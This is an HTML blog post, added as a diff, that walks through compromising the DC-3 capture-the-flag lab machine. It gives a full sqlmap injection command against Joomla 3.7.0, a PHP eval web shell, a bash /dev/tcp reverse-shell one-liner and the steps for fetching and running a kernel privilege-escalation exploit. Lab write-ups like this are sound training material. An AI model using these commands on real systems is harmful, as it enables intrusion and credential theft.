@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    DC-3 |
+    
+    yichen&#39;s blog</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="yichen's blog" type="application/atom+xml">
+</head>
+
+<body>
+<main class="content">
+  <section class="outer">
+<meta name="referrer" content="no-referrer" />
+  <article id="post-orht29" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+
+    <div class="article-inner">
+        
+            <header class="article-header">
+                
+  
+    <h1 class="article-title" itemprop="name">
+      DC-3
+    </h1>
+  
+  
+
+
+
+
+            </header>
+            
+
+                
+                    <div class="article-meta">
+                        <a href="/2020/03/31/orht29/" class="article-date">
+  <time datetime="2020-03-31T09:13:13.000Z" itemprop="datePublished">2020-03-31</time>
+</a>
+                            
+                    </div>
+                    
+
+                        
+                            
+    <div class="tocbot"></div>
+
+
+
+
+
+                                
+
+                                    <div class="article-entry" itemprop="articleBody">
+                                        
+
+
+                                            
+
+                                                
+                                                                    <h1 id="解决分配不到-IP-问题"><a href="#解决分配不到-IP-问题" class="headerlink" title="解决分配不到 IP 问题"></a>解决分配不到 IP 问题</h1><p>没法找到他的 ip，可能是网卡配置问题<br>(之前打开 .ova 文件默认联网方式是桥接，改成 NAT)</p>
+<p>在开机选择的时候，摁 e 编辑一下</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1585656125794-4f48f873-f0fc-49c8-b51c-49c489fa9af7.png#align=left&display=inline&height=325&name=image.png&originHeight=436&originWidth=640&size=14842&status=done&style=none&width=477" alt="image.png"></p>
+<p>把 ro 改成 rw single init=/bin/bash</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1585655444431-de49b535-3a12-414d-a78c-f67e52d6db2a.png#align=left&display=inline&height=334&name=image.png&originHeight=432&originWidth=640&size=25813&status=done&style=none&width=495" alt="image.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1585656184009-29ba8622-dd53-4efa-8b74-3a1062b76d5f.png#align=left&display=inline&height=331&name=image.png&originHeight=431&originWidth=640&size=26008&status=done&style=none&width=492" alt="image.png"></p>
+<p>然后 ctrl+x，就可以输入东西了</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1585655571958-0a81411b-ae5f-4863-9fa6-fd305bab4f2b.png#align=left&display=inline&height=133&name=image.png&originHeight=195&originWidth=835&size=17192&status=done&style=none&width=571" alt="image.png"></p>
+<p>ip a 查看一下实际用的是哪一个网卡</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1585655911461-b5017f6f-59d8-4945-a26b-f355dee1a8ff.png#align=left&display=inline&height=100&name=image.png&originHeight=128&originWidth=721&size=13340&status=done&style=none&width=564" alt="image.png"></p>
+<p>vim /etc/network/interfaces 看一下配置信息用的是哪一个网卡</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1585655849509-800a13bc-4a82-475a-8a7e-1fd034675e86.png#align=left&display=inline&height=160&name=image.png&originHeight=209&originWidth=582&size=13433&status=done&style=none&width=446" alt="image.png"></p>
+<p>把这俩都改成 ens33，然后  /etc/init.d/networking restart 重启网卡服务</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1585657090403-0ba1c7dd-a1dd-4d0a-9dcd-405e22a26ab7.png#align=left&display=inline&height=200&name=image.png&originHeight=310&originWidth=821&size=29400&status=done&style=none&width=529" alt="image.png"></p>
+<p>ps.我是直接关了虚拟机的电源退出来的</p>
+<p>成功扫到</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1585657242085-df79e617-0037-4199-ba39-5ad724a7fa87.png#align=left&display=inline&height=165&name=image.png&originHeight=238&originWidth=805&size=63843&status=done&style=none&width=557" alt="image.png"></p>
+<h1 id="开始打"><a href="#开始打" class="headerlink" title="开始打"></a>开始打</h1><p>这个靶机只有一个 flag 了，要 root 权限才能看<br>nmap 扫一波</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1585657401202-8de5507b-914b-4325-9a0f-03bc434d412f.png#align=left&display=inline&height=355&name=image.png&originHeight=508&originWidth=645&size=102277&status=done&style=none&width=451" alt="image.png"></p>
+<p>ps.有个 whatweb 网站指纹扫描工具</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1585657777143-9e7b9e74-e5e7-4244-af00-7bc113bc2069.png#align=left&display=inline&height=90&name=image.png&originHeight=129&originWidth=1069&size=63541&status=done&style=none&width=746" alt="image.png"></p>
+<p>还有个针对  Joomla 的扫描工具：joomscan –url <a href="http://192.168.149.157" target="_blank" rel="noopener">http://192.168.149.157</a></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1585660319702-2634a478-a2b8-4936-bffd-386553a9f770.png#align=left&display=inline&height=349&name=image.png&originHeight=473&originWidth=568&size=67191&status=done&style=none&width=419" alt="image.png"></p>
+<p>搜一下：searchsploit Joomla 3.7.0</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1585658203461-db0ecb78-00f5-4806-9121-92f9f7c60e15.png#align=left&display=inline&height=120&name=image.png&originHeight=171&originWidth=988&size=31163&status=done&style=none&width=693" alt="image.png"></p>
+<p>sqlmap 跑一下</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1585658265564-b8b6cbe5-eb52-4441-9a8a-c082aa130757.png#align=left&display=inline&height=369&name=image.png&originHeight=737&originWidth=1638&size=195490&status=done&style=none&width=819" alt="image.png"></p>
+<p>最终的 sqlmap 命令<br><code>sqlmap -u &quot;http://192.168.149.157/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot; -T &quot;#__users&quot; -C name,password --dump -p list[fullordering]</code></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1585659287487-5299b022-f778-4166-b571-c331f988ff6e.png#align=left&display=inline&height=393&name=image.png&originHeight=518&originWidth=772&size=125360&status=done&style=none&width=585" alt="image.png"></p>
+<p>把 password 的 hash 保存下来，使用 john 爆破，得到密码：snoopy</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1585659969642-bd37c1a9-4e93-4099-b14c-725baf2b966b.png#align=left&display=inline&height=410&name=image.png&originHeight=432&originWidth=619&size=92835&status=done&style=shadow&width=588" alt="image.png"></p>
+<p>使用 admin/snoopy 登录</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1585661228923-ba021058-673e-4e03-a5e4-9cada4026db8.png#align=left&display=inline&height=248&name=image.png&originHeight=372&originWidth=862&size=52170&status=done&style=none&width=575" alt="image.png"></p>
+<p>在这个地方写一句话</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1585661576890-681422f7-9112-4535-90be-03bee27db976.png#align=left&display=inline&height=171&name=image.png&originHeight=342&originWidth=1276&size=52309&status=done&style=stroke&width=638" alt="image.png"></p>
+<?php  @eval($_POST['yichen']); ?>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1585661551431-d243f956-6227-4593-a8a4-3864c295a936.png#align=left&display=inline&height=335&name=image.png&originHeight=598&originWidth=893&size=83699&status=done&style=stroke&width=501" alt="image.png"></p>
+<p>蚁剑连接一下</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1585661643260-8ba61190-02d5-406c-a809-35ff54012fb0.png#align=left&display=inline&height=411&name=image.png&originHeight=821&originWidth=1339&size=115857&status=done&style=none&width=669.5" alt="image.png"></p>
+<p>本地监听一个端口：nc -lvp 8888</p>
+<p>终端里面执行：<br><code>bash -c &#39;bash -i &amp;&gt;/dev/tcp/192.168.149.141/8888 0&gt;&amp;1&#39;</code></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1585661958257-cb674f63-4ed2-4f9c-86ca-f960a03c1d22.png#align=left&display=inline&height=418&name=image.png&originHeight=518&originWidth=790&size=79540&status=done&style=none&width=637" alt="image.png"></p>
+<p>lsb_release -a 可以看到是 ubuntu 16.04</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1585662230528-793a2f30-056e-4d5a-83fb-22f015948ca7.png#align=left&display=inline&height=157&name=image.png&originHeight=173&originWidth=444&size=27394&status=done&style=none&width=403" alt="image.png"></p>
+<p>searchsploit ubuntu 16.04，大佬们说这个可以用</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1585662366098-2c12f8d8-ec34-4277-b68d-09a86db97632.png#align=left&display=inline&height=350&name=image.png&originHeight=570&originWidth=1043&size=226285&status=done&style=none&width=640" alt="image.png"></p>
+<p>cat 一下，让去下这个东西：<br>wget <a href="https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip，就可以的呀，不知道为啥参考的文章评论区说这个" target="_blank" rel="noopener">https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip，就可以的呀，不知道为啥参考的文章评论区说这个</a> exp 没了</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1585662883528-c3a36b5a-aba5-441b-b614-a39759a2fc85.png#align=left&display=inline&height=286&name=image.png&originHeight=449&originWidth=1071&size=122101&status=done&style=none&width=683" alt="image.png"></p>
+<p>unzip 39772.zip  #解压 29772.zip 文件<br>cd 39772<br>tar -xvf exploit.tar  #解压 exploit 提权脚本 tar 包<br>cd ebpf_mapfd_doubleput_exploit</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1585662905639-c6239b7c-d564-46ab-83b9-4a13f13a3071.png#align=left&display=inline&height=325&name=image.png&originHeight=511&originWidth=672&size=114099&status=done&style=none&width=427" alt="image.png"></p>
+<p>./compile.sh   #执行脚本，编译文件<br>./doubleput  #执行提权文件</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1585663114257-8b1dc091-1134-47ab-b0b8-e48c8934ef7b.png#align=left&display=inline&height=394&name=image.png&originHeight=551&originWidth=765&size=92813&status=done&style=none&width=547" alt="image.png"></p>
+<p>在 /root 目录下存着 flag</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1585663168034-12265504-ebc0-4509-8b6b-8ea92d3cd5c5.png#align=left&display=inline&height=329&name=image.png&originHeight=658&originWidth=789&size=86287&status=done&style=none&width=394.5" alt="image.png"></p>
+
+                                                                        
+                                    </div>
+                                    <footer class="article-footer">
+                                        <a data-url="http://yoursite.com/2020/03/31/orht29/" data-id="ckco53qbt000x8ou9cvu76v7x" class="article-share-link">
+                                            Share
+                                        </a>
+                                        
+                                    </footer>
+
+    </div>
+
+    
+        
+  <nav class="article-nav">
+    
+      <a href="/2020/04/06/ttamkh/" class="article-nav-link">
+        <strong class="article-nav-caption">Newer</strong>
+        <div class="article-nav-title">
+          
+            DC-4
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2020/03/21/xwwcoc/" class="article-nav-link">
+        <strong class="article-nav-caption">Older</strong>
+        <div class="article-nav-title">DC-2</div>
+      </a>
+    
+  </nav>
+
+
+            
+
+                
+                    
+    <div class="vcomments" id="vcomments"></div>
+    
+<script src="https://unpkg.com/valine/dist/Valine.min.js"></script>
+
+        <script>
+            new Valine({
+                el: '#vcomments',
+                appId: '',
+                appKey: '',
+                notify: 'false',
+                verify: 'true',
+                avatar: 'mp',
+                pageSize: '10',
+                placeholder: '请输入...'
+            })
+        </script>
+        
+                        
+                            
+
+</article>
+</section>
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+    <li><i class="fe fe-bookmark"></i> <span id="busuanzi_value_page_pv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2020 yichen&#39;s blog</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+<aside class="sidebar">
+  <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/head.png" alt="yichen&#39;s blog"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">主页</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">归档</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="https://www.yuque.com/hxfqg9" target="_blank" rel="noopener">语雀</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="https://mp.weixin.qq.com/s/_xKmbanQddRoX2SoAcihWA" target="_blank" rel="noopener">关于</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+</aside>
+
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+
+<script src="/js/ocean.js"></script>
+
+
+</body>
+</html>
